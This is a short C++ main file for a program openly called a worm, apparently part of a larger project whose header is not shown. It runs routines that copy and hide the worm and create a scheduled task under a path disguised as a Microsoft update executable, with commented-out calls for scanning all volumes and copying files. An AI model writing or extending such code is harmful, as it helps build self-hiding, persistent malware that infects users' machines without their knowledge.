#include "worm.h"

int main() {
	
	setlocale(LC_ALL, "Russian");
	worm worm1;
	//worm worm1("E:\\test_worm", 1);
	worm1.worm_was_started();
	//worm1.scan_all_volumes();

	//worm1.search_list_dir();
	//worm1.print_list_dir();
	worm1.copy_and_hide_worm();
	worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");
	//worm1.copy_file();
	//wcout<<get_own_path();
}